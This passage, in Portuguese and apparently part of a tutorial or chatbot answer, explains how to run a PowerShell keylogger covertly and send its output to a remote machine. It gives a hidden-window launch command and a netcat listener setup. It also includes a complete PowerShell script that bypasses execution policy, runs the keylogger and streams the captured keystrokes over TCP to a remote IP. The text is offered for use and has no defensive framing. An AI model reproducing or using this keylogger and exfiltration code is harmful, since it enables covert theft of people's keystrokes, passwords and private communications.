Este script também utiliza um Hook para capturar as teclas pressionadas pelo usuário e imprime as teclas no console. Para executá-lo em background e salvar a saída para um arquivo, basta utilizar a seguinte linha de comando no PowerShell:

powershell -WindowStyle Hidden -File keylogger.ps1 > keylogger.txt

Isso irá executar o script em background e salvar a saída para o arquivo 'key

-------------------------------------------------------------------------------------------------------------

Para enviar a saída do script para um terminal Linux em outro host, você pode usar o programa 'netcat
No host remoto (Linux), execute o seguinte comando para iniciar o servidor de escuta na porta 1234:

nc -l 1234

No host local (Windows), você pode usar o seguinte script em PowerShell para enviar a saída do seu script para o servidor de escuta no host remoto:

------------------------------------------------
# Configurações do servidor de escuta
$serverAddress = "192.168.1.100" # endereço IP do host remoto
$serverPort = 1234

# Executa o script e redireciona a saída para o servidor de escuta
$keyloggerOutput = powershell.exe -ExecutionPolicy Bypass -Command "C:\caminho\para\seu\keylogger.ps1" | Out-String
$nc = New-Object System.Net.Sockets.TCPClient($serverAddress, $serverPort)
$ncStream = $nc.GetStream()
$ncWriter = New-Object System.IO.StreamWriter($ncStream)
$ncWriter.Write($keyloggerOutput)
$ncWriter.Flush()
$nc.Close()
------------------------------------------------

Substitua "192.168.1.100" pelo endereço IP do host remoto e "C:\caminho\para\seu\keylogger.ps1" pelo caminho completo para o seu script.

Este script executará seu script e redirecionará a saída para o servidor de escuta no host remoto.
